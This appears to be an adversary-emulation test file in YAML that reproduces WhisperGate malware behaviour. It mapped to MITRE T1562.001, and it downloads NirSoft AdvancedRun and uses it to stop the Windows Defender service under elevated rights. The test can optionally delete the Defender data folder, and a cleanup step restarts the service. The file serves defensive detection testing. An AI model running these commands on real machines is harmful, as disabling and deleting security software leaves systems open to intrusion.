api_version: "2.0"
name: Disable Defender Using NirSoft AdvancedRun
description: "Information on NirSoft AdvancedRun and its creators found here: http://www.nirsoft.net/utils/advanced_run.html\nThis Atomic will run AdvancedRun.exe with similar behavior identified during the WhisperGate campaign.\nSee https://medium.com/s2wblog/analysis-of-destructive-malware-whispergate-targeting-ukraine-9d5d158f19f3\nUpon successful execution, AdvancedRun.exe will attempt to run and stop Defender, and optionally attempt to delete the Defender folder on disk. \n"
args:
    - name: AdvancedRun_Location
      type: path
      default: PathToAtomicsFolder\..\ExternalPayloads\AdvancedRun.exe
    - name: delete_defender_folder
      type: int
      default: "0"
uuid: 81ce22fd-9612-4154-918e-8a1f285d214d
mitre:
    tactics:
        - 'TA0005: Defense Evasion'
    techniques:
        - 'T1562: Impair Defenses'
    subtechniques:
        - 'T1562.001: Disable or Modify Tools'
requirements:
    platforms:
        - os: windows
steps:
    - name: |
        Advancedrun.exe must exist at #{AdvancedRun_Location}
      inline: |
        if(Test-Path -Path "#{AdvancedRun_Location}") {exit 0} else {{New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
        Invoke-WebRequest "http://www.nirsoft.net/utils/advancedrun.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip"
        Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\advancedrun.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -Force
        }}
      executor: powershell
    - name: disable-defender-using-nirsoft-advancedrun
      inline: |
        Try {cmd /c "{{.Args.AdvancedRun_Location}}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "stop WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
        if({{.Args.delete_defender_folder}}){
          $CommandToRun = rmdir "$env:programdata\Microsoft\Windows Defender" -Recurse
          Try {cmd /c "{{.Args.AdvancedRun_Location}}" /EXEFilename "$env:systemroot\System32\WindowsPowershell\v1.0\powershell.exe" /WindowState 0 /CommandLine "$CommandToRun" /StartDirectory "" /RunAs 8 /Run} Catch{}
        }
      executor: powershell
      cleanup:
        inline: |
            Try {cmd /c "{{.Args.AdvancedRun_Location}}" /EXEFilename "$env:systemroot\System32\sc.exe" /WindowState 0 /CommandLine "start WinDefend" /StartDirectory "" /RunAs 8 /Run} Catch{}
        executor: powershell
